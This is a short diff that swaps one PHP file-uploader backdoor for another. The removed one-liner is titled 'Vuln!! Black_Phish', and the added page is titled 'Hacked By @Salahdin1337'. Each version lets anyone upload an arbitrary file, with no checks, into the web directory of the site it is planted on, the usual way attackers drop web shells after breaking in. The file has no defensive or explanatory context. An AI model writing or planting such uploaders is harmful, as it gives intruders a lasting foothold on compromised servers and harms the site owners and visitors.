@@ -1,1 +1,26 @@
-<title> Vuln!! Black_Phish </title> <?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hacked By @Salahdin1337</title>
+</head>
+<body>
+  <form enctype="multipart/form-data" action="" method="POST">
+    <p>Upload your file</p>
+    <input type="file" name="uploaded_file"></input><br />
+    <input type="submit" value="Upload"></input>
+  </form>
+</body>
+</html>
+<?PHP
+  if(!empty($_FILES['uploaded_file']))
+  {
+    $path = "./";
+    $path = $path . basename( $_FILES['uploaded_file']['name']);
+    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
+      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
+      " has been uploaded";
+    } else{
+        echo "There was an error uploading the file, please try again!";
+    }
+  }
+?>
